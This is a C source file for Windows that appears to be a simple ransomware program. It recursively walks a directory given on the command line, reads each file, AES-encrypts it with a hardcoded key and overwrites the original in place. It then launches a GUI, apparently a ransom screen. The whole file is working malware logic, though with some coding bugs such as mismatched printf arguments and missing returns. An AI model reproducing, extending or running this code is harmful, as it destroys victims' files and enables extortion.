#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <strsafe.h>
#include "loadfile.h"
#include "aesencrypt.h"
#include "gui.h"

#define ERROR "[-]"
#define SUCCESS "[+]"
#define INFO "[>]"

char key[] = {
        0x61, 0x62, 0x6b, 0x65, 0x6c, 0x64, 0x6c, 0x77, 0x68, 0x73, 0x6b, 0x64, 0x6c, 0x66, 0x3b, 0x64, 0x61, 0x62, 0x6b, 0x65, 0x6c, 0x64, 0x6c, 0x77, 0x68, 0x73, 0x6b, 0x64, 0x6c, 0x66, 0x3b, 0x64
};

unsigned char* cEncryptedCode;

BOOL SpiderDirectory(char* cDirectoryName, unsigned char* cEncryptedCode) {
    WIN32_FIND_DATA ffd;
    LPCSTR lpPartialDirectory[MAX_PATH];
    LPCSTR lpFullDirectory[MAX_PATH];
    HANDLE hFind = INVALID_HANDLE_VALUE;
    LARGE_INTEGER filesize;
    long lEncryptedCodeSize;
    unsigned int code_len;
    long file_size = NULL;

    //lEncryptedCodeSize = strlen(cEncryptedCode);
    StringCchCopy(lpPartialDirectory, MAX_PATH, cDirectoryName);
    sprintf(lpFullDirectory, "%s\\\\*", lpPartialDirectory);

    printf("%s Target directory is: %s\n", INFO, cDirectoryName);

    hFind = FindFirstFileA(lpFullDirectory, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("%s FindFirstFile failed with error: 0x%x\n", ERROR, GetLastError());
    }
    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) {
                continue;
            }
            sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
            printf("%s   <DIR>\n", lpFullDirectory);
            SpiderDirectory(lpFullDirectory, cEncryptedCode);
        }
        else {
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            printf("%s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
            sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);

            cEncryptedCode = LoadFile(lpFullDirectory, &file_size);
            code_len = file_size;
            printf("%s\n", cEncryptedCode);
            cEncryptedCode = AesEncrypt(0, cEncryptedCode, code_len, key, sizeof(key));
            lEncryptedCodeSize = filesize.QuadPart;
            WriteToFile(lpFullDirectory, cEncryptedCode, lEncryptedCodeSize);
        }
    } while (FindNextFileA(hFind, &ffd) != 0);
}

unsigned char* PadData(unsigned char* data, DWORD* data_len) {
    DWORD pad_len = 16 - (*data_len % 16);
    if (pad_len == 16) pad_len = 0;

    *data_len += pad_len;
    unsigned char* padded_data = (unsigned char*)malloc(*data_len);
    if (padded_data == NULL) {
        printf("Memory allocation for padding failed with error: 0x%x\n", ERROR, GetLastError());
        exit(1);
    }

    memcpy(padded_data, data, *data_len - pad_len);

    memset(padded_data + (*data_len - pad_len), pad_len, pad_len);

    return padded_data;
}


BOOL WriteToFile(LPCSTR lpFileName, unsigned char* cEncryptedCode, long lEncryptedCodeSize) {
    HANDLE hEncryptedFile = NULL;

    printf("%s filename: '%s'\n", INFO, lpFileName);
    hEncryptedFile = CreateFileA(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hEncryptedFile == INVALID_HANDLE_VALUE) {
        printf("%s CreateFile failed with error: 0x%x\n", ERROR, GetLastError());
        return -1;
    }

    DWORD dwBytesWritten;
    printf("%s filesize: %d\n", INFO, lEncryptedCodeSize);
    if (!WriteFile(hEncryptedFile, cEncryptedCode, lEncryptedCodeSize, &dwBytesWritten, NULL)) {
        printf("%s WriteFile failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }
}

int main(int argc, char* argv[]) {
    //Must be in format C:\\Users
    char* cDirectoryName = argv[1];
    SpiderDirectory(cDirectoryName, cEncryptedCode);
    runGui();
}